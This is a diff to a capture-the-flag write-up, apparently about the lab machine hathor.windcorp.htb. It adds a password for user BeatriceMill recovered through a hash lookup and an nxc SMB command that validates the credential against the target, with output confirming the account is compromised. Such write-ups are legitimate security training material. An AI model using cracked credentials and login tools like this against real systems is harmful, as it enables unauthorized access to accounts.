@@ -251,5 +251,13 @@ Checking the most recent entry:
 CrackStation has this hash for me, so i dont need to crack it!
 
 ```python
-BeatriceMill:
+BeatriceMill:!!!!ilovegood17
 ```
+
+```python
+nxc smb hathor.windcorp.htb -u 'beatricemill' -p '!!!!ilovegood17' -k                              
+SMB         hathor.windcorp.htb 445    hathor           [*]  x64 (name:hathor) (domain:windcorp.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         hathor.windcorp.htb 445    hathor           [+] windcorp.htb\beatricemill:!!!!ilovegood17
+```
+This user is compromised!
+
